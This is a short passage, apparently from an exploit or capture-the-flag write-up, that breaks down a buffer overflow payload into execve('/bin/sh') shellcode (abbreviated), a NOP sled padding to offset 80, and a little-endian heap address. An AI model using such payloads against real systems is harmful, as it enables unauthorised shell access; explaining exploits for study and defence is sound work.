### Payload breakdown

```
\x31\xc0...\xcd\x80  →  shellcode execve("/bin/sh") = 24 bytes
\x90 * 56            →  NOP sled to fill up to offset 80
\x08\xa0\x04\x08     →  heap address 0x0804a008 in little endian
```

